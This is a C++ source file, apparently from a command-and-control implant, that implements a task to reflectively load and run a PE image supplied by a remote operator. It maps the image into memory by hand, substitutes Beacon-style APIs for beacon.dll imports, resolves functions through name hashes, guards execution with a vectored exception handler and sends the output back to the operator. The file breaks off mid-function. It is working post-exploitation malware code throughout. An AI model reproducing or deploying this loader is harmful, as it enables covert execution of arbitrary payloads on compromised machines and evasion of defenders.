#include <common.h>
#include <commands.h>
#include <package.h>
#include <parser.h>
#include <config.h>
#include <strings.h>

#ifdef INCLUDE_CMD_EXECUTE_BOFPE

using namespace stardust;
using namespace starburst;

// PE structures for manual mapping
#pragma pack(push, 1)
struct PE_DOS_HEADER {
    uint16_t e_magic;
    uint16_t e_cblp;
    uint16_t e_cp;
    uint16_t e_crlc;
    uint16_t e_cparhdr;
    uint16_t e_minalloc;
    uint16_t e_maxalloc;
    uint16_t e_ss;
    uint16_t e_sp;
    uint16_t e_csum;
    uint16_t e_ip;
    uint16_t e_cs;
    uint16_t e_lfarlc;
    uint16_t e_ovno;
    uint16_t e_res[4];
    uint16_t e_oemid;
    uint16_t e_oeminfo;
    uint16_t e_res2[10];
    int32_t  e_lfanew;
};

struct PE_FILE_HEADER {
    uint16_t Machine;
    uint16_t NumberOfSections;
    uint32_t TimeDateStamp;
    uint32_t PointerToSymbolTable;
    uint32_t NumberOfSymbols;
    uint16_t SizeOfOptionalHeader;
    uint16_t Characteristics;
};

struct PE_DATA_DIRECTORY {
    uint32_t VirtualAddress;
    uint32_t Size;
};

struct PE_OPTIONAL_HEADER64 {
    uint16_t Magic;
    uint8_t  MajorLinkerVersion;
    uint8_t  MinorLinkerVersion;
    uint32_t SizeOfCode;
    uint32_t SizeOfInitializedData;
    uint32_t SizeOfUninitializedData;
    uint32_t AddressOfEntryPoint;
    uint32_t BaseOfCode;
    uint64_t ImageBase;
    uint32_t SectionAlignment;
    uint32_t FileAlignment;
    uint16_t MajorOperatingSystemVersion;
    uint16_t MinorOperatingSystemVersion;
    uint16_t MajorImageVersion;
    uint16_t MinorImageVersion;
    uint16_t MajorSubsystemVersion;
    uint16_t MinorSubsystemVersion;
    uint32_t Win32VersionValue;
    uint32_t SizeOfImage;
    uint32_t SizeOfHeaders;
    uint32_t CheckSum;
    uint16_t Subsystem;
    uint16_t DllCharacteristics;
    uint64_t SizeOfStackReserve;
    uint64_t SizeOfStackCommit;
    uint64_t SizeOfHeapReserve;
    uint64_t SizeOfHeapCommit;
    uint32_t LoaderFlags;
    uint32_t NumberOfRvaAndSizes;
    PE_DATA_DIRECTORY DataDirectory[16];
};

struct PE_NT_HEADERS64 {
    uint32_t           Signature;
    PE_FILE_HEADER     FileHeader;
    PE_OPTIONAL_HEADER64 OptionalHeader;
};

struct PE_SECTION_HEADER {
    char     Name[8];
    uint32_t VirtualSize;
    uint32_t VirtualAddress;
    uint32_t SizeOfRawData;
    uint32_t PointerToRawData;
    uint32_t PointerToRelocations;
    uint32_t PointerToLinenumbers;
    uint16_t NumberOfRelocations;
    uint16_t NumberOfLinenumbers;
    uint32_t Characteristics;
};

struct PE_IMPORT_DESCRIPTOR {
    uint32_t OriginalFirstThunk;
    uint32_t TimeDateStamp;
    uint32_t ForwarderChain;
    uint32_t Name;
    uint32_t FirstThunk;
};

struct PE_BASE_RELOCATION {
    uint32_t VirtualAddress;
    uint32_t SizeOfBlock;
};

struct PE_EXPORT_DIRECTORY {
    uint32_t Characteristics;
    uint32_t TimeDateStamp;
    uint16_t MajorVersion;
    uint16_t MinorVersion;
    uint32_t Name;
    uint32_t Base;
    uint32_t NumberOfFunctions;
    uint32_t NumberOfNames;
    uint32_t AddressOfFunctions;
    uint32_t AddressOfNames;
    uint32_t AddressOfNameOrdinals;
};

struct PE_TLS_DIRECTORY64 {
    uint64_t StartAddressOfRawData;
    uint64_t EndAddressOfRawData;
    uint64_t AddressOfIndex;
    uint64_t AddressOfCallBacks;
    uint32_t SizeOfZeroFill;
    uint32_t Characteristics;
};
#pragma pack(pop)

#define PE_MAGIC_MZ       0x5A4D
#define PE_SIGNATURE      0x00004550
#define PE_MAGIC_PE32PLUS 0x020B
#define IMAGE_DIRECTORY_ENTRY_EXPORT    0
#define IMAGE_DIRECTORY_ENTRY_IMPORT    1
#define IMAGE_DIRECTORY_ENTRY_BASERELOC 5
#define IMAGE_DIRECTORY_ENTRY_TLS       9
#define IMAGE_REL_BASED_DIR64    10
#define IMAGE_REL_BASED_HIGHLOW  3
#define IMAGE_REL_BASED_ABSOLUTE 0
#define IMAGE_ORDINAL_FLAG64     0x8000000000000000ULL
#define IMAGE_SCN_MEM_EXECUTE    0x20000000
#define IMAGE_SCN_MEM_READ       0x40000000
#define IMAGE_SCN_MEM_WRITE      0x80000000

// TEB access for instance pointer — same mechanism as COFF loader
static inline auto declfn bofpe_set_inst( instance* p ) -> void {
#ifdef _WIN64
    register void* val __asm__("rcx") = reinterpret_cast<void*>(p);
    __asm__ volatile (
        ".byte 0x65, 0x48, 0x89, 0x0c, 0x25, 0x28, 0x00, 0x00, 0x00"
        :: "c"(val) : "memory"
    );
#endif
}

static inline auto declfn bofpe_get_inst() -> instance* {
#ifdef _WIN64
    void* result;
    __asm__ volatile (
        ".byte 0x65, 0x48, 0x8b, 0x04, 0x25, 0x28, 0x00, 0x00, 0x00"
        : "=a"(result)
    );
    return static_cast<instance*>(result);
#else
    return nullptr;
#endif
}

// Beacon API implementations for BOF-PE import interception
extern "C" {

static void __cdecl declfn bofpe_beacon_printf( int type, const char* fmt, ... ) {
    (void)type;
    auto inst = bofpe_get_inst();
    if ( !inst || !fmt ) return;

    using vsnprintf_t = int ( __cdecl* )( char*, size_t, const char*, va_list );
    auto p_vsnprintf = reinterpret_cast<vsnprintf_t>(
        resolve::_api( inst->ntdll.handle, expr::hash_string( "_vsnprintf" ) ) );

    char buf[2048];
    int len;

    if ( p_vsnprintf ) {
        va_list args;
        va_start( args, fmt );
        len = p_vsnprintf( buf, sizeof(buf) - 1, fmt, args );
        va_end( args );
        if ( len < 0 ) len = sizeof(buf) - 1;
        buf[len] = '\0';
    } else {
        len = 0;
        auto s = fmt;
        while ( *s && len < (int)sizeof(buf) - 1 ) buf[len++] = *s++;
        buf[len] = '\0';
    }

    auto& coff = inst->coff;
    if ( coff.output_length + (uint32_t)len + 2 > coff.output_capacity ) {
        uint32_t new_cap = coff.output_capacity == 0 ? 4096 : coff.output_capacity;
        while ( new_cap < coff.output_length + (uint32_t)len + 2 ) new_cap *= 2;
        coff.output_data = static_cast<char*>(
            inst->heap_realloc( coff.output_data, new_cap ) );
        coff.output_capacity = new_cap;
    }

    memory::copy( coff.output_data + coff.output_length, buf, len );
    coff.output_length += len;
    coff.output_data[coff.output_length] = '\0';
}

static void __cdecl declfn bofpe_beacon_output( int type, const char* data, int len ) {
    (void)type;
    auto inst = bofpe_get_inst();
    if ( !inst || !data || len <= 0 ) return;

    auto& coff = inst->coff;
    if ( coff.output_length + len + 2 > coff.output_capacity ) {
        uint32_t new_cap = coff.output_capacity == 0 ? 4096 : coff.output_capacity;
        while ( new_cap < coff.output_length + (uint32_t)len + 2 ) new_cap *= 2;
        coff.output_data = static_cast<char*>(
            inst->heap_realloc( coff.output_data, new_cap ) );
        coff.output_capacity = new_cap;
    }

    memory::copy( coff.output_data + coff.output_length, const_cast<char*>(data), len );
    coff.output_length += len;
    coff.output_data[coff.output_length] = '\0';
}

struct bofpe_datap {
    char*    original;
    char*    buffer;
    int      length;
    int      size;
};

static void __cdecl declfn bofpe_beacon_data_parse( bofpe_datap* dp, char* buf, int size ) {
    dp->original = buf;
    dp->buffer = buf;
    dp->length = size;
    dp->size = size;
}

static int __cdecl declfn bofpe_beacon_data_int( bofpe_datap* dp ) {
    if ( dp->length < 4 ) return 0;
    int val = *reinterpret_cast<int*>( dp->buffer );
    dp->buffer += 4;
    dp->length -= 4;
    return val;
}

static short __cdecl declfn bofpe_beacon_data_short( bofpe_datap* dp ) {
    if ( dp->length < 2 ) return 0;
    short val = *reinterpret_cast<short*>( dp->buffer );
    dp->buffer += 2;
    dp->length -= 2;
    return val;
}

static char* __cdecl declfn bofpe_beacon_data_extract( bofpe_datap* dp, int* out_len ) {
    if ( dp->length < 4 ) { if ( out_len ) *out_len = 0; return nullptr; }
    int len = *reinterpret_cast<int*>( dp->buffer );
    dp->buffer += 4;
    dp->length -= 4;
    if ( dp->length < len ) { if ( out_len ) *out_len = 0; return nullptr; }
    char* result = dp->buffer;
    dp->buffer += len;
    dp->length -= len;
    if ( out_len ) *out_len = len;
    return result;
}

static int __cdecl declfn bofpe_beacon_data_length( bofpe_datap* dp ) {
    return dp->length;
}

struct bofpe_formatp {
    char*    original;
    char*    buffer;
    int      length;
    int      size;
};

static void __cdecl declfn bofpe_beacon_format_alloc( bofpe_formatp* fp, int maxsz ) {
    auto inst = bofpe_get_inst();
    if ( inst ) {
        fp->original = static_cast<char*>( inst->heap_alloc( maxsz ) );
        fp->buffer = fp->original;
        fp->length = 0;
        fp->size = maxsz;
    }
}

static void __cdecl declfn bofpe_beacon_format_reset( bofpe_formatp* fp ) {
    fp->buffer = fp->original;
    fp->length = 0;
}

static void __cdecl declfn bofpe_beacon_format_free( bofpe_formatp* fp ) {
    auto inst = bofpe_get_inst();
    if ( inst && fp->original ) {
        inst->heap_free( fp->original );
        fp->original = nullptr;
        fp->buffer = nullptr;
    }
}

static void __cdecl declfn bofpe_beacon_format_append( bofpe_formatp* fp, const char* buf, int len ) {
    if ( fp->length + len <= fp->size ) {
        memory::copy( fp->buffer + fp->length, const_cast<char*>(buf), len );
        fp->length += len;
    }
}

static void __cdecl declfn bofpe_beacon_format_printf( bofpe_formatp* fp, const char* fmt, ... ) {
    auto inst = bofpe_get_inst();
    if ( !inst || !fp || !fmt ) return;

    using vsnprintf_t = int ( __cdecl* )( char*, size_t, const char*, va_list );
    auto p_vsnprintf = reinterpret_cast<vsnprintf_t>(
        resolve::_api( inst->ntdll.handle, expr::hash_string( "_vsnprintf" ) ) );
    if ( !p_vsnprintf ) return;

    int avail = fp->size - fp->length;
    if ( avail <= 0 ) return;

    va_list args;
    va_start( args, fmt );
    int written = p_vsnprintf( fp->buffer + fp->length, avail, fmt, args );
    va_end( args );
    if ( written > 0 ) fp->length += written;
}

static char* __cdecl declfn bofpe_beacon_format_tostring( bofpe_formatp* fp, int* size ) {
    if ( size ) *size = fp->length;
    return fp->original;
}

static void __cdecl declfn bofpe_beacon_format_int( bofpe_formatp* fp, int val ) {
    bofpe_beacon_format_append( fp, reinterpret_cast<char*>( &val ), 4 );
}

static BOOL __cdecl declfn bofpe_beacon_is_admin() {
    return FALSE;
}

static DWORD __cdecl declfn bofpe_beacon_get_spawn_to( BOOL x86, char* buf, int len ) {
    auto inst = bofpe_get_inst();
    if ( !inst || !buf || len <= 0 ) return 0;
    const char* src = x86 ? inst->spawnto.x86 : inst->spawnto.x64;
    int i = 0;
    while ( src[i] && i < len - 1 ) { buf[i] = src[i]; i++; }
    buf[i] = '\0';
    return static_cast<DWORD>( i );
}

static void __cdecl declfn bofpe_beacon_cleanup( void* ctx ) {
    (void)ctx;
}

} // extern "C"

// FNV-1a for beacon API name matching
static constexpr uint32_t _bofpe_fnv1a( const char* s ) {
    uint32_t h = 0x811c9dc5;
    while ( *s ) { h ^= (uint8_t)*s++; h *= 0x01000193; }
    return h;
}

static auto declfn _bofpe_hash( const char* s ) -> uint32_t {
    uint32_t h = 0x811c9dc5;
    while ( *s ) { h ^= (uint8_t)*s++; h *= 0x01000193; }
    return h;
}

static auto declfn resolve_beacon_import( const char* name ) -> void* {
    uint32_t h = _bofpe_hash( name );
    switch ( h ) {
        case _bofpe_fnv1a("BeaconPrintf"):           return (void*)bofpe_beacon_printf;
        case _bofpe_fnv1a("BeaconOutput"):           return (void*)bofpe_beacon_output;
        case _bofpe_fnv1a("BeaconDataParse"):        return (void*)bofpe_beacon_data_parse;
        case _bofpe_fnv1a("BeaconDataInt"):          return (void*)bofpe_beacon_data_int;
        case _bofpe_fnv1a("BeaconDataShort"):        return (void*)bofpe_beacon_data_short;
        case _bofpe_fnv1a("BeaconDataExtract"):      return (void*)bofpe_beacon_data_extract;
        case _bofpe_fnv1a("BeaconDataLength"):       return (void*)bofpe_beacon_data_length;
        case _bofpe_fnv1a("BeaconFormatAlloc"):      return (void*)bofpe_beacon_format_alloc;
        case _bofpe_fnv1a("BeaconFormatReset"):      return (void*)bofpe_beacon_format_reset;
        case _bofpe_fnv1a("BeaconFormatFree"):       return (void*)bofpe_beacon_format_free;
        case _bofpe_fnv1a("BeaconFormatAppend"):     return (void*)bofpe_beacon_format_append;
        case _bofpe_fnv1a("BeaconFormatPrintf"):     return (void*)bofpe_beacon_format_printf;
        case _bofpe_fnv1a("BeaconFormatToString"):   return (void*)bofpe_beacon_format_tostring;
        case _bofpe_fnv1a("BeaconFormatInt"):        return (void*)bofpe_beacon_format_int;
        case _bofpe_fnv1a("BeaconIsAdmin"):          return (void*)bofpe_beacon_is_admin;
        case _bofpe_fnv1a("BeaconGetSpawnTo"):       return (void*)bofpe_beacon_get_spawn_to;
        case _bofpe_fnv1a("BeaconCleanupProcess"):   return (void*)bofpe_beacon_cleanup;
    }
    return nullptr;
}

// case-insensitive comparison for DLL name matching
static auto declfn _str_icmp( const char* a, const char* b ) -> bool {
    while ( *a && *b ) {
        char ca = *a, cb = *b;
        if ( ca >= 'A' && ca <= 'Z' ) ca += 32;
        if ( cb >= 'A' && cb <= 'Z' ) cb += 32;
        if ( ca != cb ) return false;
        a++; b++;
    }
    return *a == *b;
}

// read current thread ID from TEB
static inline auto declfn bofpe_get_tid() -> uint32_t {
#ifdef _WIN64
    uint32_t tid;
    __asm__ volatile (
        ".byte 0x65, 0x8b, 0x04, 0x25, 0x48, 0x00, 0x00, 0x00"
        : "=a"(tid)
    );
    return tid;
#else
    uint32_t tid;
    __asm__ volatile (
        ".byte 0x64, 0x8b, 0x04, 0x25, 0x24, 0x00, 0x00, 0x00"
        : "=a"(tid)
    );
    return tid;
#endif
}

static auto WINAPI declfn bofpe_crash_handler(
    EXCEPTION_POINTERS* ep ) -> LONG
{
    auto inst = bofpe_get_inst();
    if ( !inst || !inst->coff.guard_active )
        return EXCEPTION_CONTINUE_SEARCH;

    if ( bofpe_get_tid() != inst->coff.bof_thread_id )
        return EXCEPTION_CONTINUE_SEARCH;

    inst->coff.crash_code = ep->ExceptionRecord->ExceptionCode;
    inst->coff.guard_active = 0;

#ifdef _WIN64
    ep->ContextRecord->Rcx = ep->ExceptionRecord->ExceptionCode;
    ep->ContextRecord->Rip = inst->coff.exit_thread_addr;
    ep->ContextRecord->Rsp &= ~0xFull;
    ep->ContextRecord->Rsp -= 8;
#else
    ep->ContextRecord->Esp -= 4;
    *reinterpret_cast<uint32_t*>( ep->ContextRecord->Esp ) =
        ep->ExceptionRecord->ExceptionCode;
    ep->ContextRecord->Eip = static_cast<uint32_t>( inst->coff.exit_thread_addr );
#endif

    return EXCEPTION_CONTINUE_EXECUTION;
}

struct bofpe_run_ctx {
    void*     entry;
    char*     args;
    int       args_len;
    instance* inst;
};

static DWORD WINAPI declfn bofpe_thread_fn( LPVOID param ) {
    auto ctx = static_cast<bofpe_run_ctx*>( param );
    bofpe_set_inst( ctx->inst );
    ctx->inst->coff.bof_thread_id = bofpe_get_tid();
    ctx->inst->coff.guard_active = 1;

    typedef void ( *bofpe_entry )( const char*, int );
    auto fn = reinterpret_cast<bofpe_entry>( ctx->entry );
    fn( ctx->args, ctx->args_len );

    ctx->inst->coff.guard_active = 0;
    return 0;
}

// Determine section memory protection from characteristics
static auto declfn section_protection( uint32_t chars ) -> DWORD {
    bool exec  = ( chars & IMAGE_SCN_MEM_EXECUTE ) != 0;
    bool read  = ( chars & IMAGE_SCN_MEM_READ )    != 0;
    bool write = ( chars & IMAGE_SCN_MEM_WRITE )   != 0;

    if ( exec && write ) return PAGE_EXECUTE_READWRITE;
    if ( exec && read )  return PAGE_EXECUTE_READ;
    if ( exec )          return PAGE_EXECUTE;
    if ( write )         return PAGE_READWRITE;
    if ( read )          return PAGE_READONLY;
    return PAGE_NOACCESS;
}

auto declfn starburst::cmd_execute_bofpe(
    _Inout_ instance& inst,
    _In_    char*     task_uuid,
    _In_    Parser*   params
) -> void {
    // Parse PE data
    uint32_t pe_len = 0;
    auto pe_data = parser_bytes( params, &pe_len );
    uint32_t args_len = 0;
    auto args_data = parser_bytes( params, &args_len );
    uint32_t entry_name_len = 0;
    auto entry_name = parser_string( params, &entry_name_len );

    if ( !pe_data || pe_len < sizeof(PE_DOS_HEADER) ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "no PE data" ) ) );
        return;
    }

    char entry_buf[64] = { 'g', 'o', '\0' };
    if ( entry_name && entry_name_len > 0 ) {
        memory::copy( entry_buf, entry_name,
            entry_name_len < 63 ? entry_name_len : 63 );
        entry_buf[entry_name_len < 63 ? entry_name_len : 63] = '\0';
    }

    // Validate DOS header
    auto dos = reinterpret_cast<PE_DOS_HEADER*>( pe_data );
    if ( dos->e_magic != PE_MAGIC_MZ ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "invalid PE: bad MZ" ) ) );
        return;
    }

    if ( (uint32_t)dos->e_lfanew + sizeof(PE_NT_HEADERS64) > pe_len ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "invalid PE: truncated" ) ) );
        return;
    }

    auto nt = reinterpret_cast<PE_NT_HEADERS64*>( pe_data + dos->e_lfanew );
    if ( nt->Signature != PE_SIGNATURE ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "invalid PE: bad signature" ) ) );
        return;
    }

    if ( nt->OptionalHeader.Magic != PE_MAGIC_PE32PLUS ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "only x64 PE supported" ) ) );
        return;
    }

    DBG_PRINT( inst, "bofpe: %u bytes, entry=%s, ImageBase=0x%llx, SizeOfImage=0x%x\n",
        pe_len, entry_buf, nt->OptionalHeader.ImageBase, nt->OptionalHeader.SizeOfImage );

    // Allocate memory for the PE image
    uint32_t image_size = nt->OptionalHeader.SizeOfImage;
    auto image_base = static_cast<uint8_t*>(
        inst.kernel32.VirtualAlloc(
            nullptr, image_size,
            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE ) );
    if ( !image_base ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "VirtualAlloc failed for PE" ) ) );
        return;
    }

    // Copy PE headers
    uint32_t headers_size = nt->OptionalHeader.SizeOfHeaders;
    if ( headers_size > pe_len ) headers_size = pe_len;
    memory::copy( image_base, pe_data, headers_size );

    // Map sections
    auto sections = reinterpret_cast<PE_SECTION_HEADER*>(
        pe_data + dos->e_lfanew + sizeof(PE_NT_HEADERS64) );
    uint16_t num_sections = nt->FileHeader.NumberOfSections;

    for ( uint16_t i = 0; i < num_sections; i++ ) {
        if ( sections[i].SizeOfRawData == 0 ) continue;
        if ( sections[i].PointerToRawData + sections[i].SizeOfRawData > pe_len ) {
            DBG_PRINT( inst, "bofpe: section %d out of bounds, skipping\n", i );
            continue;
        }
        if ( sections[i].VirtualAddress + sections[i].SizeOfRawData > image_size ) {
            DBG_PRINT( inst, "bofpe: section %d exceeds image size, skipping\n", i );
            continue;
        }
        memory::copy(
            image_base + sections[i].VirtualAddress,
            pe_data + sections[i].PointerToRawData,
            sections[i].SizeOfRawData );
    }

    // Apply base relocations
    uintptr_t delta = reinterpret_cast<uintptr_t>( image_base ) -
                      nt->OptionalHeader.ImageBase;

    if ( delta != 0 &&
         nt->OptionalHeader.NumberOfRvaAndSizes > IMAGE_DIRECTORY_ENTRY_BASERELOC &&
         nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size > 0 ) {
        auto reloc_dir = &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
        auto reloc = reinterpret_cast<PE_BASE_RELOCATION*>(
            image_base + reloc_dir->VirtualAddress );
        uint32_t reloc_end = reloc_dir->VirtualAddress + reloc_dir->Size;

        while ( reinterpret_cast<uintptr_t>( reloc ) <
                reinterpret_cast<uintptr_t>( image_base + reloc_end ) &&
                reloc->SizeOfBlock >= sizeof(PE_BASE_RELOCATION) ) {
            uint32_t num_entries = ( reloc->SizeOfBlock - sizeof(PE_BASE_RELOCATION) ) / 2;
            auto entries = reinterpret_cast<uint16_t*>(
                reinterpret_cast<uint8_t*>( reloc ) + sizeof(PE_BASE_RELOCATION) );

            for ( uint32_t i = 0; i < num_entries; i++ ) {
                uint16_t type   = entries[i] >> 12;
                uint16_t offset = entries[i] & 0x0FFF;
                auto patch_addr = image_base + reloc->VirtualAddress + offset;

                if ( type == IMAGE_REL_BASED_DIR64 ) {
                    *reinterpret_cast<uint64_t*>( patch_addr ) += delta;
                } else if ( type == IMAGE_REL_BASED_HIGHLOW ) {
                    *reinterpret_cast<uint32_t*>( patch_addr ) +=
                        static_cast<uint32_t>( delta );
                }
                // IMAGE_REL_BASED_ABSOLUTE is a no-op (padding)
            }

            reloc = reinterpret_cast<PE_BASE_RELOCATION*>(
                reinterpret_cast<uint8_t*>( reloc ) + reloc->SizeOfBlock );
        }
    }

    // Resolve imports — intercept beacon.dll
    bool import_ok = true;
    if ( nt->OptionalHeader.NumberOfRvaAndSizes > IMAGE_DIRECTORY_ENTRY_IMPORT &&
         nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size > 0 ) {
        auto import_dir = &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
        auto desc = reinterpret_cast<PE_IMPORT_DESCRIPTOR*>(
            image_base + import_dir->VirtualAddress );

        while ( desc->Name != 0 ) {
            auto dll_name = reinterpret_cast<char*>( image_base + desc->Name );
            bool is_beacon = _str_icmp( dll_name, "beacon.dll" ) ||
                             _str_icmp( dll_name, "beacon" );

            HMODULE h_mod = nullptr;
            if ( !is_beacon ) {
                h_mod = reinterpret_cast<HMODULE>(
                    inst.kernel32.LoadLibraryA( dll_name ) );
                if ( !h_mod ) {
                    DBG_PRINT( inst, "bofpe: failed to load %s\n", dll_name );
                    import_ok = false;
                    break;
                }
            }

            auto thunk_ref = reinterpret_cast<uint64_t*>(
                image_base + ( desc->OriginalFirstThunk ?
                    desc->OriginalFirstThunk : desc->FirstThunk ) );
            auto func_ref = reinterpret_cast<uint64_t*>(
                image_base + desc->FirstThunk );

            for ( ; *thunk_ref; thunk_ref++, func_ref++ ) {
                void* resolved = nullptr;

                if ( *thunk_ref & IMAGE_ORDINAL_FLAG64 ) {
                    // Import by ordinal
                    uint16_t ordinal = (uint16_t)( *thunk_ref & 0xFFFF );
                    if ( is_beacon ) {
                        DBG_PRINT( inst, "bofpe: beacon ordinal %u unsupported\n", ordinal );
                    } else if ( h_mod ) {
                        resolved = (void*)inst.kernel32.GetProcAddress(
                            h_mod, (LPCSTR)(uintptr_t)ordinal );
                    }
                } else {
                    // Import by name — skip 2-byte hint
                    auto func_name = reinterpret_cast<char*>(
                        image_base + (uint32_t)*thunk_ref + 2 );

                    if ( is_beacon ) {
                        resolved = resolve_beacon_import( func_name );
                        DBG_PRINT( inst, "bofpe: beacon import '%s' -> %p\n",
                            func_name, resolved );
                    } else if ( h_mod ) {
                        resolved = (void*)inst.kernel32.GetProcAddress(
                            h_mod, func_name );
                    }
                }

                if ( resolved ) {
                    *func_ref = reinterpret_cast<uint64_t>( resolved );
                } else if ( is_beacon ) {
                    DBG_PRINT( inst, "bofpe: unresolved beacon import at thunk\n" );
                    *func_ref = 0;
                } else {
                    DBG_PRINT( inst, "bofpe: unresolved import in %s\n", dll_name );
                }
            }

            desc++;
        }
    }

    if ( !import_ok ) {
        inst.kernel32.VirtualFree( image_base, 0, MEM_RELEASE );
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "import resolution failed" ) ) );
        return;
    }

    // Process TLS callbacks
    if ( nt->OptionalHeader.NumberOfRvaAndSizes > IMAGE_DIRECTORY_ENTRY_TLS &&
         nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].Size > 0 ) {
        auto tls = reinterpret_cast<PE_TLS_DIRECTORY64*>(
            image_base + nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress );
        if ( tls->AddressOfCallBacks ) {
            auto callbacks = reinterpret_cast<uint64_t*>( tls->AddressOfCallBacks );
            while ( *callbacks ) {
                typedef void ( WINAPI *tls_callback_t )( PVOID, DWORD, PVOID );
                auto cb = reinterpret_cast<tls_callback_t>( *callbacks );
                cb( image_base, DLL_PROCESS_ATTACH, nullptr );
                callbacks++;
            }
        }
    }

    // Set section memory protections
    for ( uint16_t i = 0; i < num_sections; i++ ) {
        uint32_t sec_size = sections[i].VirtualSize;
        if ( sec_size == 0 ) sec_size = sections[i].SizeOfRawData;
        if ( sec_size == 0 ) continue;

        DWORD prot = section_protection( sections[i].Characteristics );
        DWORD old_prot;
        inst.kernel32.VirtualProtect(
            image_base + sections[i].VirtualAddress,
            sec_size, prot, &old_prot );
    }

    // Find export "go" (or specified entry point)
    void* entry_ptr = nullptr;
    if ( nt->OptionalHeader.NumberOfRvaAndSizes > IMAGE_DIRECTORY_ENTRY_EXPORT &&
         nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size > 0 ) {
        auto exp_dir = reinterpret_cast<PE_EXPORT_DIRECTORY*>(
            image_base + nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress );

        auto names    = reinterpret_cast<uint32_t*>( image_base + exp_dir->AddressOfNames );
        auto ordinals = reinterpret_cast<uint16_t*>( image_base + exp_dir->AddressOfNameOrdinals );
        auto funcs    = reinterpret_cast<uint32_t*>( image_base + exp_dir->AddressOfFunctions );

        for ( uint32_t i = 0; i < exp_dir->NumberOfNames; i++ ) {
            auto exp_name = reinterpret_cast<char*>( image_base + names[i] );
            if ( str_cmp( exp_name, entry_buf ) == 0 ) {
                uint16_t ord = ordinals[i];
                entry_ptr = image_base + funcs[ord];
                DBG_PRINT( inst, "bofpe: found export '%s' at %p\n", entry_buf, entry_ptr );
                break;
            }
        }
    }

    if ( !entry_ptr ) {
        inst.kernel32.VirtualFree( image_base, 0, MEM_RELEASE );
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "entry point not found in exports" ) ) );
        return;
    }

    // Setup output capture
    inst.coff.output_data = static_cast<char*>( inst.heap_alloc( 4096 ) );
    inst.coff.output_length = 0;
    inst.coff.output_capacity = 4096;
    inst.coff.crash_code = 0;
    inst.coff.guard_active = 0;
    if ( inst.coff.output_data ) inst.coff.output_data[0] = '\0';

    // Setup VEH for crash isolation
    auto pAddVEH = reinterpret_cast<decltype(RtlAddVectoredExceptionHandler)*>(
        resolve::_api( inst.ntdll.handle,
            expr::hash_string( "RtlAddVectoredExceptionHandler" ) ) );
    auto pRemoveVEH = reinterpret_cast<decltype(RtlRemoveVectoredExceptionHandler)*>(
        resolve::_api( inst.ntdll.handle,
            expr::hash_string( "RtlRemoveVectoredExceptionHandler" ) ) );

    inst.coff.exit_thread_addr = reinterpret_cast<uintptr_t>(
        resolve::_api( inst.ntdll.handle,
            expr::hash_string( "RtlExitUserThread" ) ) );

    void* veh = nullptr;
    if ( pAddVEH && inst.coff.exit_thread_addr ) {
        veh = pAddVEH( 1,
            reinterpret_cast<PVECTORED_EXCEPTION_HANDLER>( bofpe_crash_handler ) );
    }

    DBG_PRINT( inst, "bofpe: calling entry at %p, args=%p len=%u\n",
        entry_ptr, args_data, args_len );

    // Execute in a separate thread for crash isolation
    bool exec_ok = false;

    bofpe_run_ctx ctx = { entry_ptr,
        reinterpret_cast<char*>( args_data ), static_cast<int>( args_len ), &inst };

    HANDLE h_thread = inst.kernel32.CreateThread(
        nullptr, 0,
        reinterpret_cast<LPTHREAD_START_ROUTINE>( bofpe_thread_fn ),
        &ctx, 0, nullptr );

    if ( h_thread ) {
        DWORD wait = inst.kernel32.WaitForSingleObject( h_thread, 120000 );
        DWORD exit_code = 0;
        inst.kernel32.GetExitCodeThread( h_thread, &exit_code );

        if ( wait == WAIT_TIMEOUT ) {
            inst.kernel32.TerminateThread( h_thread, 1 );
            DBG_PRINT( inst, "bofpe: timed out after 120s\n" );
        } else if ( exit_code == 0 ) {
            exec_ok = true;
        } else {
            DBG_PRINT( inst, "bofpe: crashed with 0x%08X\n", exit_code );
        }
        inst.kernel32.CloseHandle( h_thread );
    } else {
        // Fallback: run in current thread
        instance* old_aup = bofpe_get_inst();
        bofpe_set_inst( &inst );

        typedef void ( *bofpe_entry_fn )( const char*, int );
        auto fn = reinterpret_cast<bofpe_entry_fn>( entry_ptr );
        fn( reinterpret_cast<const char*>( args_data ), args_len );

        bofpe_set_inst( old_aup );
        exec_ok = true;
    }

    if ( veh && pRemoveVEH )
        pRemoveVEH( veh );

    DBG_PRINT( inst, "bofpe: done ok=%d crash=0x%08X output_len=%u\n",
        exec_ok, inst.coff.crash_code, inst.coff.output_length );

    // Report results
    if ( exec_ok && inst.coff.output_data && inst.coff.output_length > 0 ) {
        queue_response( inst, task_uuid, RESPONSE_SUCCESS, inst.coff.output_data );
    } else if ( exec_ok ) {
        queue_response( inst, task_uuid, RESPONSE_SUCCESS,
            symbol<char*>( const_cast<char*>( "BOF-PE executed (no output)" ) ) );
    } else if ( inst.coff.crash_code ) {
        char err[32] = { 'B','O','F','-','P','E',' ','c','r','a','s','h',':',' ','0','x' };
        uint32_t code = inst.coff.crash_code;
        for ( int d = 7; d >= 0; d-- ) {
            uint32_t n = ( code >> ( d * 4 ) ) & 0xF;
            err[16 + (7 - d)] = n < 10 ? '0' + n : 'A' + n - 10;
        }
        err[24] = '\0';
        queue_response( inst, task_uuid, RESPONSE_ERROR, err );
    } else {
